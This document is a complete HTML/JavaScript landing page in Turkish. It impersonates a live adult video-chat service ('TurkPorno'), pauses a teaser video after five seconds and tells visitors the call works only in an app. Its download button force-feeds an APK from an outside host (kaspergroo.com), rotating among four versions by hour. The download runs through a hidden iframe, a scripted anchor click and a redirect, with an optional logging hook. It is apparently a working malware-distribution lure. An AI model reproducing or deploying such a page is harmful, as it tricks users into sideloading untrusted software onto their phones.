<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Görüntülü Görüşme - TurkPorno</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
    <style>
        * {
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }
        body, html {
            margin: 0;
            padding: 0;
            height: 100%;
            width: 100%;
            overflow: hidden;
            background: #000;
        }
        video {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 100%;
            height: 100%;
            object-fit: cover;
            transform: translate(-50%, -50%);
            z-index: 0;
        }
        .stopped {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            z-index: 20;
            display: none;
            backdrop-filter: blur(2px);
        }
        @keyframes pulse-heart {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.05); }
        }
        .animate-pulse-heart {
            animation: pulse-heart 1s ease-in-out infinite;
        }
        .btn-press:active { transform: scale(0.96); }
        @media (max-width: 640px) {
            .stopped { width: 85%; max-width: 320px; }
        }
        .toast-notification {
            position: fixed;
            bottom: 100px;
            left: 50%;
            transform: translateX(-50%) translateY(100px);
            background: linear-gradient(135deg, #1e1e2f, #2a2a3b);
            color: white;
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 14px;
            z-index: 100;
            opacity: 0;
            transition: all 0.3s ease;
            pointer-events: none;
        }
        .toast-notification.show {
            transform: translateX(-50%) translateY(0);
            opacity: 1;
        }
        .loading-spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 0.8s linear infinite;
            margin-right: 8px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        button:disabled { cursor: not-allowed; opacity: 0.7; }
    </style>
</head>
<body>

    <div class="toast-notification" id="toastMsg">
        <i class="fa-solid fa-circle-check"></i>
        <span id="toastText">İndirme başlatıldı!</span>
    </div>

    <div class="bg-black bg-opacity-60 backdrop-blur-sm flex absolute py-1.5 px-4 rounded-full gap-2 top-4 left-3 z-10">
        <span class="relative flex h-3 w-3">
            <span class="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75"></span>
            <span class="relative inline-flex rounded-full h-3 w-3 bg-red-500"></span>
        </span>
        <p class="text-white text-sm font-medium">Canlı Yayın</p>
    </div>

    <video autoplay muted loop id="backgroundVideo"></video>

    <div class="bg-white/95 backdrop-blur-sm fixed bottom-0 w-full p-3 rounded-t-3xl shadow-2xl z-10">
        <div class="bg-gray-300 w-24 h-1 rounded-2xl m-auto mb-2"></div>
        <div class="flex gap-10 justify-center p-2">
            <div class="bg-[#F0F0F0] flex justify-center items-center w-12 h-12 rounded-full shadow-md btn-press">
                <i class="fa-solid fa-volume-xmark text-gray-700 text-xl"></i>
            </div>
            <div class="bg-[#F0F0F0] flex justify-center items-center w-12 h-12 rounded-full shadow-md btn-press">
                <i class="fa-solid fa-video-slash text-gray-700 text-xl"></i>
            </div>
            <div class="bg-[#F0F0F0] flex justify-center items-center w-12 h-12 rounded-full shadow-md btn-press">
                <i class="fa-solid fa-microphone-slash text-gray-700 text-xl"></i>
            </div>
            <div class="bg-[#FAE4E6] flex justify-center items-center w-12 h-12 rounded-full shadow-md btn-press">
                <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 24 24' stroke='%23dc2626' stroke-width='1.5'%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M15 10.5a3 3 0 11-6 0 3 3 0 016 0z' /%3E%3Cpath stroke-linecap='round' stroke-linejoin='round' d='M19.5 10.5c0 7.142-7.5 11.25-7.5 11.25S4.5 17.642 4.5 10.5a7.5 7.5 0 1115 0z' /%3E%3C/svg%3E" class="w-5 h-5">
            </div>
        </div>
    </div>

    <div class="bg-white rounded-2xl shadow-2xl flex flex-col justify-center items-center gap-4 py-8 px-6 text-center stopped" id="stoppedDiv">
        <p class="font-extrabold text-2xl bg-gradient-to-r from-purple-700 to-pink-600 bg-clip-text text-transparent">TurkPorno</p>
        <p class="font-normal text-gray-600 text-sm">Görüntülü görüşmeler sadece mobil uygulamada</p>
        
        <button id="downloadBtn"
            class="bg-[#6156DF] hover:bg-[#4f44c5] animate-pulse-heart text-white w-48 rounded-xl flex items-center justify-center py-3.5 px-5 shadow-lg transition-all duration-200 font-semibold text-base">
            İndir
            <i class="fa-solid fa-angle-right absolute right-5 text-white text-sm"></i>
        </button>
        
        <ul class="list-disc text-[11px] text-gray-500">
            <li>Üyelik tamamen ücretsizdir</li>
            <li>Hızlı & güvenli indirme</li>
        </ul>
    </div>

    <script>
        const videos = Array(20).fill().map((_, i) => `videos/video${i+1}.mp4`);
        
        const APK_LINKS = [
            "http://kaspergroo.com/sohbetss/TurkPornoV1.apk",
            "http://kaspergroo.com/sohbetss/TurkPornoV2.apk",
            "http://kaspergroo.com/sohbetss/TurkPornoV3.apk",
            "http://kaspergroo.com/sohbetss/TurkPornoV4.apk"
        ];

        function getApkLink() {
            const hour = new Date().getHours();
            return APK_LINKS[Math.floor(hour / 6) % APK_LINKS.length];
        }

        function showToast(msg, isError = false) {
            const toast = document.getElementById('toastMsg');
            document.getElementById('toastText').textContent = msg;
            const icon = toast.querySelector('i');
            if (isError) {
                icon.className = 'fa-solid fa-circle-exclamation';
                icon.style.color = '#ef4444';
            } else {
                icon.className = 'fa-solid fa-circle-check';
                icon.style.color = '#10b981';
            }
            toast.classList.add('show');
            setTimeout(() => toast.classList.remove('show'), 3000);
        }

        // EN GÜÇLÜ İNDİRME YÖNTEMİ - iframe + anchor kombosu
        function forceDownload(url, filename = 'TurkPorno.apk') {
            // Yöntem 1: XMLHttpRequest ile dosyayı çek (cross-orion sorunu olabilir)
            // Yöntem 2: iframe ile yönlendir
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = url;
            document.body.appendChild(iframe);
            
            setTimeout(() => {
                document.body.removeChild(iframe);
            }, 3000);
            
            // Yöntem 3: Aynı anda anchor ile dene
            const link = document.createElement('a');
            link.href = url;
            link.setAttribute('download', filename);
            link.setAttribute('target', '_blank');
            link.style.display = 'none';
            document.body.appendChild(link);
            link.click();
            
            setTimeout(() => {
                document.body.removeChild(link);
            }, 100);
            
            return true;
        }

        // Video ayarları
        window.onload = () => {
            const video = document.getElementById('backgroundVideo');
            if (video) {
                video.src = videos[Math.floor(Math.random() * videos.length)];
                video.play().catch(() => {});
            }
            
            setTimeout(() => {
                video?.pause();
                document.getElementById('stoppedDiv').style.display = 'flex';
            }, 5000);
        };

        // İndirme butonu
        document.addEventListener('DOMContentLoaded', () => {
            const btn = document.getElementById('downloadBtn');
            let loading = false;
            
            btn.addEventListener('click', async (e) => {
                e.preventDefault();
                if (loading) return;
                loading = true;
                
                const apkUrl = getApkLink();
                console.log('İndirme linki:', apkUrl);
                
                btn.innerHTML = `<span class="loading-spinner"></span> Yönlendiriliyor...`;
                btn.disabled = true;
                
                try {
                    // Log.js varsa çağır
                    if (typeof window.sendLog === 'function') {
                        await window.sendLog(apkUrl);
                    }
                    
                    // ⭐ KRİTİK: Doğrudan yönlendirme yap
                    // Tarayıcı APK'yı indirmezse kullanıcıya manuel seçenek sun
                    showToast('İndirme başlatılıyor...');
                    
                    // Önce anchor ile dene
                    const a = document.createElement('a');
                    a.href = apkUrl;
                    a.download = 'TurkPorno.apk';
                    a.click();
                    
                    // 2 saniye sonra eğer indirme başlamadıysa direkt git
                    setTimeout(() => {
                        window.location.href = apkUrl;
                    }, 500);
                    
                } catch (err) {
                    showToast('Bağlantı hatası', true);
                }
                
                setTimeout(() => {
                    btn.innerHTML = `Tekrar İndir <i class="fa-solid fa-arrow-rotate-right absolute right-5"></i>`;
                    btn.disabled = false;
                    loading = false;
                }, 3000);
            });
        });
        
        // Video kontrol butonları
        const videoEl = document.getElementById('backgroundVideo');
        document.querySelectorAll('.btn-press').forEach((btn, idx) => {
            btn.addEventListener('click', () => {
                if (idx === 0 && videoEl) videoEl.muted = !videoEl.muted;
                if (idx === 1 && videoEl) videoEl.paused ? videoEl.play() : videoEl.pause();
                if (idx === 2) showToast('Ses ayarı sadece uygulamada');
                if (idx === 3) showToast('Arama sadece uygulamada');
            });
        });
    </script>
</body>
</html>
